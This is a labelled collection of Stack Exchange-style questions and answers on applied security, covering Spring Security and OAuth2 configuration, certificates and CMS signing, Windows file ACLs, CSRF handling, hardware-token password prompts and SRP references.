<p>I thought that changing one character of the private PEM would result in an entirely new public PEM. Am I missing something, or can some characters in fact be modified without affecting the public PEM result?</p>

<p>The JavaScript library I'm using to generate the public PEM from a private PEM is <a href=""https://www.npmjs.org/package/node-rsa"" rel=""nofollow"">rzcoder's node-rsa</a>, which uses <a href=""http://www-cs-students.stanford.edu/~tjw/jsbn/"" rel=""nofollow"">Tom Wu's jsbn crypto library</a>.</p>
",1
"<blockquote>
  <p>who should issue the client certificate?</p>
</blockquote>

<p>An approved authority which is trusted by API service provider. This is not necessary the API service provider itself (though, it is common), this task may be delegated to another entity which will follow requirements set by API provider. When delegated, API provider should be assured that only legitimate and properly authenticated clients receive client certificates.</p>

<p>Certainly, not client is responsible to create client certificates.</p>

<h1>Update</h1>

<p>Depending on particular case, there might be several common scenarios:</p>

<ol>
<li>service provider issues all client certificates. API server is configured to trust only certificates issued by service provider's CAs.</li>
</ol>

<p>This is simplest approach. Client generates CSR and submits it to service provider's CA. When request is properly authenticated and validated, client receives signed certificate which is then used to access API.</p>

<p><strong>Pros:</strong> service provider tracks all individual clients and their certificates.</p>

<p><strong>Cons:</strong> service provider has to maintain all infrastructure to work with validation of client requests and maintain them (renew, reissue, revoke, etc.). May have a notable overhead (for both parties) when client entities are not strictly defined. That is, when you have only 5 clients, this approach is certainly good. When you have thousands, this may be a problem, because service provider will have to follow SLA.</p>

<ol start=""2"">
<li>there is B2B (business-to-business) relationships. Service provider's CA may issue a qualified cross-certificate (with required constraints) to client's issuing CA. Client organization's CA issues certificate to its own personnel to access remote service provider API</li>
</ol>

<p>This option is required to have an operable private PKIs in both organizations, service provider and client organization. Client organization may have a large number of client entities who are allowed to access service provider.</p>

<p><strong>Pros:</strong> reduces certificate management costs on service provider end. Especially when exact number and name of client entities is not known in advance (for example, access is granted on a departament basis). Allows better certificate lifecycle management within client organization.</p>

<p><strong>Cons:</strong> requires a qualified trust between client organization and service provider organization. This opens a hole when client organization may misissue client certificates and not considered well trusted. This question is commonly solved by using PKI audits by a 3rd party audit company. There will be a written policy that describes all technical and legal relationships between organizations. But this approach is costy too (audits, writing policies, etc.).</p>

<p>In some cases, this scenario is grown to more than just 2 organizations and in order to limit a number of cross-certificates, a Bridge CA is built to organize a trust between organizations.</p>
",1
"<p>Is there an analog of the <a href=""https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setfilesecuritya"" rel=""nofollow noreferrer""><code>SetFileSecurity</code> function</a>?</p>

<p>I need to re-write some tests from Python and I'm stuck on this part. In Python I can freely edit a DACL with <code>pywin32</code> (modules with a C++ implementation to work with Windows API). 
I can edit any ACE with <code>win32security</code>.</p>

<p>Change owner to <code>Everyone</code>? Okay.</p>

<pre><code>win32security.SetNamedSecurityInfo(""somefile.txt"", win32security.SE_FILE_OBJECT,
                                       win32security.OWNER_SECURITY_INFORMATION,
                                       win32security.ConvertStringSidToSid(""S-1-1-0""))
sd.SetSecurityDescriptorDacl(1, dacl, 0)
win32security.SetFileSecurity(filename, win32security.DACL_SECURITY_INFORMATION, sd)
</code></pre>

<p>Remove an inherited ACE? Easy.</p>

<pre><code>sd = win32security.GetFileSecurity("""", win32security.DACL_SECURITY_INFORMATION)
dacl = SECURITY_DESCRIPTOR.GetSecurityDescriptorDacl()
dacl.DeleteAce(0)
sd.SetSecurityDescriptorDacl(1, dacl, 0)  # may not be necessary
win32security.SetFileSecurity(filename, win32security.DACL_SECURITY_INFORMATION, sd)
</code></pre>

<p>And all of those without some special permissions.</p>

<p>But if I want to do something like this in C#.  One way I found is changing a security descriptor with pure SDDL, but using <code>System.Security.File.SetAccessControl()</code> with <code>FileSecurity</code> doesn't work if <code>SetSecurityDescriptorSddlForm</code> was called without the <code>SeSecurityPrivilege</code> privilege. Also, even using an administrator token with nearly all privileges, if I want to change something in a ""wrong"" way (delete some inherited ACEs), the security descriptor doesn't apply. If I try to do something ""very wrong"", like set the owner to <code>Everyone</code>, an exception will be thrown.</p>

<pre><code>var sddl_everyone_owner = @""O:S-1-1-0G:DUD:P"";
var path = @""C:\Users\someuser\test.txt"";
FileSecurity fs_edit = new FileSecurity();
fs_edit.SetSecurityDescriptorSddlForm(sddl_everyone_owner);
File.SetAccessControl(path, fs_edit);
</code></pre>

<p>Run with administrator token:</p>

<pre><code>Unhandled Exception: System.InvalidOperationException: The security identifier is not 
allowed to be the owner of this object.
at System.Security.AccessControl.NativeObjectSecurity.Persist(String name, SafeHandle 
   handle, 
   AccessControlSections includeSections, Object exceptionContext)
at System.Security.AccessControl.NativeObjectSecurity.Persist(String name, 
   AccessControlSections includeSections, Object exceptionContext)
at System.Security.AccessControl.NativeObjectSecurity.Persist(String name, 
   AccessControlSections includeSections)
at System.Security.AccessControl.FileSystemSecurity.Persist(String fullPath)
at System.IO.File.SetAccessControl(String path, FileSecurity fileSecurity)
at rtest.Program.Main(String[] args) in C:\somepath\Program.cs:line 52
</code></pre>
",1
"<p>When the student user try to upload image through CKEditor following dialog appeared with an error message.</p>

<p><a href=""https://i.stack.imgur.com/GWeRe.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GWeRe.png"" alt=""enter image description here""></a></p>

<p>I have been searching for a solution for this.still unable to resolve.</p>

<blockquote>
  <p>org.sakaiproject.exception.PermissionException
  user=58095d7f-9abf-405a-a746-b3bdd673f216 lock=content.new
  resource=/content/group/52b29c56-c607-4c31-966d-e0394a7eeb78/21761483_756386641230111_2474470716028905585_n.jpg
    at
  org.sakaiproject.content.impl.BaseContentService.unlock(BaseContentService.java:1784)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3587)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3141)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3211)
    at
  org.sakaiproject.content.impl.BaseContentService.addResource(BaseContentService.java:3200)
    at
  org.sakaiproject.connector.fck.FCKConnectorServlet.doPost(FCKConnectorServlet.java:355)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:646)     at
  javax.servlet.http.HttpServlet.service(HttpServlet.java:727)  at
  org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)
    at
  org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
    at
  org.sakaiproject.util.RequestFilter.doFilter(RequestFilter.java:709)
    at
  org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)
    at
  org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
    at
  org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:220)
    at
  org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:122)
    at
  org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:501)
    at
  org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:170)
    at
  org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
    at
  org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:950)
    at
  org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:116)
    at
  org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:408)
    at
  org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1041)
    at
  org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:607)
    at
  org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:313)
    at
  java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1152)
    at
  java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:622)
    at java.lang.Thread.run(Thread.java:748)</p>
</blockquote>
",1
"<p>So we've implemented the <strong>OAuth2 - client credentials grant</strong> between our <strong>REST server</strong> and a <strong>client application server</strong> using <strong>spring-security</strong> . The client can access its resources with the token it gets using client credentials authentication. </p>

<p>What I don't get are the <strong>Scopes</strong> I can set up for a client and the resources. </p>

<p>I explicitly said, <strong>Client A</strong> has <strong>Role X</strong> with <strong>Scope READ</strong> and I said <strong>Resource U</strong> can be accessed with <strong>Role X</strong> and <strong>Scope READ</strong>. Now I expect the resource to reject any <code>DELETE</code> or <code>POST</code> request but apparently I am mistaken. If I send a <code>HTTP DELETE</code> to <strong>Resource U</strong> it will get through.</p>

<p>So it looks like the Scopes are meaningless in my setup. How can I make use of them?</p>

<p>Or do I still need to limit access at the resource itself as I suggested below?</p>

<hr>

<p>Snippets from our setup:</p>

<pre><code>&lt;oauth:client-details-service id=""clientDetails""&gt;
    &lt;oauth:client client-id=""the_client""
        authorized-grant-types=""client_credentials"" authorities=""ROLE_CLIENT""
        scope=""read"" secret=""secret"" /&gt;
&lt;/oauth:client-details-service&gt;


&lt;http pattern=""/rest/**"" create-session=""never""
    entry-point-ref=""oauthAuthenticationEntryPoint""
    access-decision-manager-ref=""accessDecisionManager""
    xmlns=""http://www.springframework.org/schema/security""&gt;
    &lt;anonymous enabled=""false"" /&gt;

    &lt;intercept-url pattern=""/rest/persons"" access=""ROLE_CLIENT,SCOPE_READ"" /&gt;

    &lt;custom-filter ref=""resourceServerFilter"" before=""PRE_AUTH_FILTER"" /&gt;
    &lt;access-denied-handler ref=""oauthAccessDeniedHandler"" /&gt;
&lt;/http&gt;
</code></pre>

<p>The REST resource:</p>

<pre><code>@Path(""/persons"")
@Named
public class PersonRest {

    @GET
    @Consumes(MediaType.APPLICATION_FORM_URLENCODED)
    @Produces({ MediaType.APPLICATION_JSON })
    public Response getAll(@Context UriInfo uriInfo) {
        // ...
    }

    @DELETE
    @Path(""/{id}"")
    @Consumes(MediaType.TEXT_PLAIN)
    @Produces(MediaType.APPLICATION_JSON)
    @Transactional
    public Response delete(@PathParam(""id"") String id) {
        // ...
    }
</code></pre>

<hr>

<p><strong>Is there any ""simple"" configuration to tell spring security on the server side, that ROLE_READ should allow only GET requests?</strong> </p>

<p>Or do I need some <code>@PreAuthorize</code> annotation or context setup for the specific resource?</p>

<p>So, would something like that work: ? </p>

<pre><code>    @PreAuthorize(""hasScope(read)"")
    @DELETE
    @Path(""/{id}"")
    // ...
    public Response delete(@PathParam(""id"") String id) {
</code></pre>

<p>Though that would be horrible news if I had to do it this way as then I'd have to configure each resource individually...</p>

<p>Maybe I can make use of some <strong>filter</strong>?</p>

<p>Thanks for any help with this!</p>
",1
"<p>While trying to extract SignerCertificate (X509) from CMS Signed data, my code is giving error, no certificate found. I am using bouncycastle libraries for this purpose.</p>

<p>I think I am unable to sign it properly.The code snippets are attached, Have a look and please correct where I am going wrong.</p>

<p>Here is my signing code</p>

<pre><code>        byte[] tokenBytes = TokenUtils.encode( token );
        CMSProcessableByteArray cmsBytes = new CMSProcessableByteArray( tokenBytes ); 

        CMSSignedDataGenerator gen = new CMSSignedDataGenerator();
        List certList = new ArrayList();

        certList.add(certificate);
        Security.addProvider(new BouncyCastleProvider());
        ContentSigner sha1Signer = new JcaContentSignerBuilder(""SHA1withRSA"").setProvider(""BC"").build(privateKey);
        gen.addSignerInfoGenerator(
                new JcaSignerInfoGeneratorBuilder(
                     new JcaDigestCalculatorProviderBuilder().setProvider(""BC"").build())
                     .build(sha1Signer, certificate));

       signedData = gen.generate(cmsBytes, true);
</code></pre>

<p>And here is how i am verifying the signature</p>

<pre><code>public boolean verifySignature( X509Certificate certificate ) throws TokenException {
     Iterator i = signedData.getSignerInfos().getSigners().iterator();
    while ( i.hasNext() ) {

        SignerInformation s = (SignerInformation) i.next();


        try {
            if ( s.verify(new JcaSimpleSignerInfoVerifierBuilder().setProvider(""BC"").build(certificate)))
                return true;
        } catch ( Exception e ) {
            logger.error( ""Error verifying signature."", e );
            throw new TokenException( ""Error verifying token signature."", e );
        }
    }
    return false;
}
</code></pre>

<p>And method for getting signer certificate</p>

<pre><code> public X509Certificate getSignerCertificate() throws TokenException    {        
    if ( signedData == null )
        throw new TokenException( ""No one has signed this token yet!"" );

    try {
        //CertStore certStore = signedData.getCertificatesAndCRLs( ""Collection"", ""SUN"" );
        CertStore certStore = signedData.getCertificatesAndCRLs( ""Collection"", ""SUN"" );

        SignerInformationStore sis = signedData.getSignerInfos();
        Collection c = sis.getSigners();

        if ( c.size() != 1 )
            throw new TokenException( ""Expected one signature, found "" + c.size() );

        Iterator i = c.iterator();
        SignerInformation s = (SignerInformation) i.next();
        Collection certs = certStore.getCertificates( s.getSID() );
        if ( certs.size() != 1 )
            throw new TokenException( ""Expected one certificate, found "" + certs.size() );
        return (X509Certificate) certs.iterator().next();

    } catch ( CMSException cmse ) {
        throw new TokenException( ""Error extracting CertStore from token."", cmse );
    } catch ( GeneralSecurityException gse ) {
        throw new TokenException( ""Provider error extracting certs."", gse );
    } 
}
</code></pre>
",1
"<p>I adapted the following OAauth2 Spring Cloud samples:</p>

<p><a href=""https://github.com/spring-cloud-samples/authserver"" rel=""noreferrer"">Authserver</a> / <a href=""https://github.com/spring-cloud-samples/sso"" rel=""noreferrer"">SSO</a></p>

<p>The only change I made, was using JPA on the Authserver side to check the credentials from a database. Everything works well, except deploying it behind an nginx proxy. As used in the sample apps above, Spring Boot and embedded Tomcat is used. I also properly configured proxy headers:</p>

<pre><code>server.tomcat.protocol-header=X-Forwarded-Proto
server.tomcat.remote-ip-header=X-Real-IP
</code></pre>

<p>Proxying HTTP is working:</p>

<pre><code>accessTokenUri: http://uaa.sample.com/oauth/token
userAuthorizationUri: http://uaa.sample.com/oauth/authorize
</code></pre>

<p>So far so good, but I need to use SSL (obviously):</p>

<pre><code>accessTokenUri: https://uaa.sample.com/oauth/token
userAuthorizationUri: https://uaa.sample.com/oauth/authorize
</code></pre>

<p>If I switch to SSL, I get a 401 from my client application after the auth server is redirecting back from authorize. I captured the HTTP traffic and everything seems to work:</p>

<ul>
<li>GET request to client application</li>
<li>Client app redirects to /login</li>
<li>/login redirects to <a href=""https://uaa.sample.com/oauth/authorize?client_id=reprisk&amp;redirect_uri=http://test.sample.com/login&amp;response_type=code&amp;state=9prwi2"" rel=""noreferrer"">https://uaa.sample.com/oauth/authorize?client_id=reprisk&amp;redirect_uri=http://test.sample.com/login&amp;response_type=code&amp;state=9prwi2</a></li>
<li>Auth server redirects to <a href=""https://uaa.sample.com/login"" rel=""noreferrer"">https://uaa.sample.com/login</a></li>
<li>After login, authorize is called again and the server finally redirects to <a href=""http://test.sample.com/login?code=212eRK&amp;state=9prwi2"" rel=""noreferrer"">http://test.sample.com/login?code=212eRK&amp;state=9prwi2</a></li>
</ul>

<p>The HTTP traffic for HTTP and HTTPS is exactly the same, except that for HTTP a proper referer is set for the last request (AFAIK, the referer isn't checked during OAuth authentication, right?):</p>

<p>HTTP:</p>

<pre><code>GET /login?code=212eRK&amp;state=9prwi2 HTTP/1.1
Host: test.sample.com
...
Referer: http://uaa.sample.com/login
Cookie: JSESSIONID=401EB8D1D1F4297160D518EC253A0CB5; XSRF-TOKEN=95a00a0d-3362-4e9b-b7eb-45addf2d10b4
...

---
HTTP/1.1 302 Found
</code></pre>

<p>HTTPS:</p>

<pre><code>GET /login?code=212eRK&amp;state=9prwi2 HTTP/1.1
Host: test.sample.com
...
Cookie: JSESSIONID=401EB8D1D1F4297160D518EC253A0CB5; XSRF-TOKEN=95a00a0d-3362-4e9b-b7eb-45addf2d10b4
...

---
HTTP/1.1 401 Unauthorized
</code></pre>

<p>Corresponding log message from client application:</p>

<pre><code>Authentication request failed: org.springframework.security.authentication.BadCredentialsException: Could not obtain access token.
</code></pre>

<p>Any ideas why using a proxy and SSL isn't working? I'm happy to share more code and/or log output!</p>

<p>Thanks!!!</p>
",1
"<p>I am using spring security along with Websocket, I have the following method,</p>

<pre><code>@PreAuthorize(""hasAuthority('ROLE_CREATE_USER')"")
@MessageMapping(""/cashDeposit"")
public void cashDeposit(CashDepositRequest cashDepositRequest) {
</code></pre>

<p>And I have websocket security configuration. Now the problem is, when access is denied, it is throwing an exception,</p>

<pre><code>org.springframework.security.access.AccessDeniedException: Access is denied
at org.springframework.security.access.vote.AffirmativeBased.decide(AffirmativeBased.java:84) ~[spring-security-core-4.1.1.RELEASE.jar:4.1.1.RELEASE]
at org.springframework.security.access.intercept.AbstractSecurityInterceptor.beforeInvocation(AbstractSecurityInterceptor.java:233) ~[spring-security-core-4.1.1.RELEASE.jar:4.1.1.RELEASE]
</code></pre>

<p>And I searched through Stackoverflow and I found most of the questions are related to Servlets (HTTPServletRequest/Response) and not to Websocket.</p>

<p>Please let me know, how to handle AccessDeniedException for websocket and how to send a websocket message back to the user saying 403 forbidden.</p>

<h2>UPDATE</h2>

<p>My security config</p>

<pre><code>@Configuration
public class WebSocketSecurityConfig extends          
AbstractSecurityWebSocketMessageBrokerConfigurer {

@Override
protected void configureInbound(MessageSecurityMetadataSourceRegistry messages) {

    messages.simpMessageDestMatchers(""/topic/**"").permitAll()
            .anyMessage().authenticated();
}
@Override
protected boolean sameOriginDisabled() {
    //disable CSRF for websockets for now...
    return true;
}
}
</code></pre>

<p>My security config for rest services,</p>

<pre><code>    @Override
protected void configure(HttpSecurity http) throws Exception {
    http    .csrf().disable()
            .headers().addHeaderWriter( new XFrameOptionsHeaderWriter(
                    XFrameOptionsHeaderWriter.XFrameOptionsMode.SAMEORIGIN)).and()
            .authorizeRequests()
                .antMatchers(""/index.html"").permitAll()
                .antMatchers(""/**.js"").permitAll()
                .antMatchers(""/**.css"").permitAll()
                .anyRequest().authenticated().and()
            .authenticationProvider(authenticationProvider())
                .exceptionHandling()
                .authenticationEntryPoint(entryPoint)
                .and()
            .formLogin()
                .usernameParameter(""username"")
                .passwordParameter(""password"")
                .successHandler(loginSuccessHandler)
                .failureHandler(loginFailureHandler)
                .and()
            .logout()
                .permitAll()
                .logoutRequestMatcher(new AntPathRequestMatcher(""/login"", ""DELETE""))
                .logoutSuccessHandler(logoutSuccessHandler)
                .deleteCookies(""JSESSIONID"")
                .invalidateHttpSession(true)
                .and()
            .sessionManagement()
                .enableSessionUrlRewriting(true)
                .maximumSessions(1);

}
</code></pre>
",1
"<p>Here's the <em>Security</em> section from my RSS reader, in the form of the OPML file so you can read it directly into yours. It's oriented to news about latest exploits on the 'user level', i.e. what you can encounter 'out there'. </p>

<pre><code>&lt;?xml version=""1.0"" encoding=""UTF-8""?&gt;
&lt;opml xmlns:rssowl=""http://www.rssowl.org"" version=""1.1""&gt;
  &lt;head&gt;
    &lt;title&gt;RSSOwl Subscriptions&lt;/title&gt;
    &lt;dateModified&gt;do, 23 mei 2013 11:58:05 CEST&lt;/dateModified&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;outline text=""My Feeds"" rssowl:isSet=""true"" rssowl:id=""7""&gt;
      &lt;outline text=""Computing"" rssowl:isSet=""false"" rssowl:id=""1881""&gt;
        &lt;outline text=""Security"" rssowl:isSet=""false"" rssowl:id=""9363""&gt;
          &lt;outline text=""Latest Hacker News"" xmlUrl=""http://www.viruslist.com/en/rss/latesthackernews"" rssowl:id=""9364"" /&gt;
          &lt;outline text=""F-Secure Antivirus Research Weblog"" xmlUrl=""http://www.f-secure.com/weblog/weblog.rdf"" rssowl:id=""9365"" /&gt;
          &lt;outline text=""Websense Security Labs Blog"" xmlUrl=""http://community.websense.com/blogs/securitylabs/rss.aspx"" rssowl:id=""9366"" /&gt;
          &lt;outline text=""Kasperky Lab Weblog"" xmlUrl=""http://www.viruslist.com/en/rss/weblog"" rssowl:id=""9367"" /&gt;
          &lt;outline text=""Schneier on Security"" xmlUrl=""http://www.schneier.com/blog/index.xml"" rssowl:id=""9368"" /&gt;
          &lt;outline text=""Safe and Savvy"" xmlUrl=""http://safeandsavvy.f-secure.com/feed/"" rssowl:id=""9369"" /&gt;
          &lt;outline text=""Graham Cluley's blog"" xmlUrl=""http://feeds.sophos.com/en/rss2_0-sophos-graham-cluley.xml"" rssowl:id=""9370"" /&gt;
          &lt;outline text=""Krebs on Security"" xmlUrl=""http://www.krebsonsecurity.com/feed/"" rssowl:id=""9371"" /&gt;
          &lt;outline text=""InSecurity Complex"" xmlUrl=""http://news.cnet.com/8300-27080_3-245.xml?tag=rtcol;about"" rssowl:id=""9372"" /&gt;
          &lt;outline text=""Social Media Security"" xmlUrl=""http://feeds2.feedburner.com/SocialMediaSecurity"" rssowl:id=""9373"" /&gt;
          &lt;outline text=""SunbeltBLOG"" xmlUrl=""http://sunbeltblog.blogspot.com/atom.xml"" rssowl:id=""9374"" /&gt;
          &lt;outline text=""Steve (GRC) Gibson's BlogSteve (GRC) Gibson's Blog"" xmlUrl=""http://feeds.feedburner.com/SteveGibsonsBlog"" rssowl:id=""9375"" /&gt;
          &lt;outline text=""CounterMeasures -  A Security Blog"" xmlUrl=""http://countermeasures.trendmicro.eu/feed"" rssowl:id=""9376"" /&gt;
          &lt;outline text=""The Last Watchdog"" xmlUrl=""http://feeds2.feedburner.com/LastWatchdog"" rssowl:id=""9377"" /&gt;
          &lt;outline text=""Social Engineering - Security Through Education"" xmlUrl=""http://www.social-engineer.org/blog/feed/"" rssowl:id=""9379"" /&gt;
        &lt;/outline&gt;
      &lt;/outline&gt;
    &lt;/outline&gt;
  &lt;/body&gt;
&lt;/opml&gt;
</code></pre>

<p>Or edit the individual URLs out...</p>

<p>I can also post the <em>Security</em> folder from my browser bookmarks (with all subfolders) but that's huge. It's mostly URLs for guides and tutorials and not news.</p>
",1
"<p>I'm trying to setup a pure resource server using spring oAuth2 which will validate access token from a authorization server.</p>

<p>I'm not able to protect my resources. I'm directly able to hit the api.
example: </p>

<ul>
<li>GET
localhost:8080/accounts?access_token=63884b81-a3d3-4eab-a92c-7eb1e2022dfd
(incorrect access token)

<ul>
<li>GET localhost:8080/accounts</li>
</ul></li>
</ul>

<p>Above both link are able to access my resource but these link should return unauthorized error.</p>

<p>resource server config.</p>

<pre><code>&lt;bean id=""authenticationEntryPoint""
    class=""org.springframework.security.oauth2.provider.error.OAuth2AuthenticationEntryPoint""&gt;
    &lt;property name=""realmName"" value=""myRealm"" /&gt;
&lt;/bean&gt;

&lt;bean id=""oauthAccessDeniedHandler""
    class=""org.springframework.security.oauth2.provider.error.OAuth2AccessDeniedHandler"" /&gt;

&lt;bean id=""accessDecisionManager"" class=""org.springframework.security.access.vote.UnanimousBased""&gt;
    &lt;constructor-arg&gt;
        &lt;list&gt;
            &lt;bean class=""org.springframework.security.oauth2.provider.vote.ScopeVoter"" /&gt;
            &lt;bean class=""org.springframework.security.access.vote.RoleVoter"" /&gt;
            &lt;bean class=""org.springframework.security.access.vote.AuthenticatedVoter"" /&gt;
        &lt;/list&gt;
    &lt;/constructor-arg&gt;
&lt;/bean&gt;

&lt;!-- This is not actually used, but it's required by Spring Security --&gt;
&lt;security:authentication-manager alias=""authenticationManager"" /&gt;

&lt;oauth2:expression-handler id=""oauthExpressionHandler"" /&gt;

&lt;oauth2:web-expression-handler id=""oauthWebExpressionHandler"" /&gt;

&lt;security:global-method-security
    pre-post-annotations=""enabled"" proxy-target-class=""true""&gt;
    &lt;security:expression-handler ref=""oauthExpressionHandler"" /&gt;
&lt;/security:global-method-security&gt;

&lt;oauth2:resource-server id=""myResource""
    resource-id=""myResourceId"" token-services-ref=""tokenServices"" /&gt;

&lt;security:http pattern=""/**"" create-session=""never""
    entry-point-ref=""authenticationEntryPoint""
    access-decision-manager-ref=""accessDecisionManager""&gt;
    &lt;security:anonymous enabled=""false"" /&gt;
    &lt;security:intercept-url pattern=""/**""
        access=""IS_AUTHENTICATED_FULLY"" method=""GET"" /&gt;
    &lt;security:intercept-url pattern=""/**"" access=""SCOPE_READ""
        method=""HEAD"" /&gt;
    &lt;security:intercept-url pattern=""/**"" access=""SCOPE_READ""
        method=""OPTIONS"" /&gt;
    &lt;security:intercept-url pattern=""/**"" access=""SCOPE_WRITE""
        method=""PUT"" /&gt;
    &lt;security:intercept-url pattern=""/**"" access=""SCOPE_WRITE""
        method=""POST"" /&gt;
    &lt;security:intercept-url pattern=""/**"" access=""SCOPE_WRITE""
        method=""DELETE"" /&gt;
    &lt;security:custom-filter ref=""myResource""
        before=""PRE_AUTH_FILTER"" /&gt;
    &lt;security:access-denied-handler ref=""oauthAccessDeniedHandler"" /&gt;
    &lt;security:expression-handler ref=""oauthWebExpressionHandler"" /&gt;
&lt;/security:http&gt;
</code></pre>

<p></p>
",1
"<p>I have a web application with the back using Java Spring and the front using AngularJS.</p>

<p><strong>Spring Security Configuration (Java config)</strong>:</p>

<pre class=""lang-java prettyprint-override""><code>@Override
protected void configure(HttpSecurity http) throws Exception {
        http
        .authenticationProvider(authenticationProvider())
        .exceptionHandling().authenticationEntryPoint(authenticationEntryPoint)
        .and()
        .formLogin().loginProcessingUrl(""loginProcessingUrl"")
                    .successHandler(authSuccessHandler)
                    .failureHandler(authFailureHandler)
                    .usernameParameter(""username"")
                    .passwordParameter(""password"")
        .and()
        .logout().permitAll().logoutSuccessHandler(logoutSuccessHandler)
        .and()
        .authorizeRequests().antMatchers(""/demo/**"",""/postTest/**"").permitAll()
        .anyRequest().authenticated()
        .and()
        .httpBasic()
        .and()
        .csrf().csrfTokenRepository(csrfTokenRepository())
        .and()
        .addFilterAfter(new CsrfCustomFilter(), CsrfFilter.class);
    }
</code></pre>

<p><strong>CSRF filter</strong>:</p>

<pre class=""lang-java prettyprint-override""><code>public class CsrfCustomFilter extends OncePerRequestFilter{

@Override
protected void doFilterInternal(HttpServletRequest request,
        HttpServletResponse response, FilterChain filterChain)
        throws ServletException, IOException {

    CsrfToken csrf = (CsrfToken) request.getAttribute(CsrfToken.class.getName());
    if (csrf != null) {
      Cookie cookie = WebUtils.getCookie(request, ""XSRF-TOKEN"");
      String token = csrf.getToken();
      if (cookie==null || token!=null &amp;&amp; !token.equals(cookie.getValue())) {
        cookie = new Cookie(""XSRF-TOKEN"", token);
        cookie.setPath(""/"");
        response.addCookie(cookie);
      }
    }
    filterChain.doFilter(request, response);
}
}
</code></pre>

<p><strong>POST request from AngularJS</strong>:</p>

<pre class=""lang-js prettyprint-override""><code>$http({method:'POST',data:""celine"",url:""http://localhost:8080/postTest"",cache:true})
        .success(function(data) {
          console.log(""success POST"");
        })
        .error(function(data, status, headers, config, statusText) {
          console.log(""status: "" + status + "" statusText: "" + statusText);
        });
</code></pre>

<p><strong>-- UPDATED --</strong><br>
I can use a GET request from the front to the back, but the POST request doesn't seem to work. I get a <code>403 Forbidden</code> error on the front side (in my log: ""status: 403 statusText: undefined"").</p>

<p>For the POST request, I can correctly send a XSRF-TOKEN to Spring, but Spring returns <code>403 Forbidden</code>. So I guess that the problem is coming from my configuration of Spring Security and not from Angular.</p>

<p><strong>My headers for the POST request</strong>:
<img src=""https://i.stack.imgur.com/Cvqed.png"" alt=""enter image description here""></p>

<p>Thank you for your time.</p>
",1
"<p>I'll need to use an hardware token, specifically the SafeNet eToken 5110 that comes with DigiCert's EV certificates, for code-signing on Windows.</p>

<p>I know that they issue a prompt to manually enter the token's password at each signing attempt (or at each session, if you enable the single logon option).</p>

<hr>

<h2>I wonder:</h2>

<p>How safe are those prompts from keylogging or other password interception techniques?</p>

<p>And thus how much would I increase security by really filling those prompts manually vs. automating them with methods such as those listed <a href=""https://stackoverflow.com/questions/17927895/automate-extended-validation-ev-code-signing/"">here</a> ?</p>

<hr>

<p>I know that by automating the process I would increase the attack surface, by the fact that the password will probably be stored on disk and for sure on various additional memory locations, but I have a feeling that these software password prompts are nonetheless mostly ""security theater"", and that there are easy ways to intercept the password (and thus have it later entered programmatically by a malicious program) even if manually typed .</p>

<hr>

<p>Here I assume that the computer where the token will be used will be an up-to-date Windows 10 system reasonably hardened, so for sure at least not running under an administrative account. It certainly won't be fully isolated though (one way or another I'll have to pass the files to be signed to the system).</p>

<p><strong>EDIT:</strong><br>
I realized that this environment description might be too vague, if that's the problem for the time being we can assume instead a fresh Windows 10 installation, running under a limited account, with decent passwords for that and the administrator's account, connected to the internet through a lan and let's say even joined to a domain.<br>
The rest of the lan is not to be considered really safe.<br>
Let's just add that Windows' privacy options have been all set to deny, just to take out the possibility that Windows sends out the password to its servers to ""improve typing"", which wouldn't surprise me too much.<br>
I'm not concerned about physical attacks here.  </p>

<hr>

<p>I found the eToken 5110's <a href=""http://csrc.nist.gov/groups/STM/cmvp/documents/140-1/140sp/140sp2825.pdf"" rel=""nofollow noreferrer"">FIPS 140 security policy</a>. I gave it a quick look but I didn't get too much from it, it doesn't seem to be concerned with the part of the password entry from its typing to when it gets sent to the device.</p>

<p>I think (but not 100% sure) that it is a <a href=""http://www.usb.org/developers/docs/devclass_docs/DWG_Smart-Card_CCID_Rev110.pdf"" rel=""nofollow noreferrer"">USB CCID</a> device and that it uses the <a href=""https://msdn.microsoft.com/en-us/library/windows/hardware/dn653571%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">Microsoft Class Drivers for USB CCID Smart Cards</a>, and that this entails that the password entry is handled mostly by the operating system, rather than by code from the vendor (but again not 100% sure).</p>
",1
"<p>You may want to use RFC <a href=""http://tools.ietf.org/html/rfc2945"">2945</a> and <a href=""http://tools.ietf.org/html/rfc5054"">5054</a> (description of SRP, and of how to use SRP with TLS, respectively); they are a bit more ""down to the wire"" than the mathematical description from the author.</p>

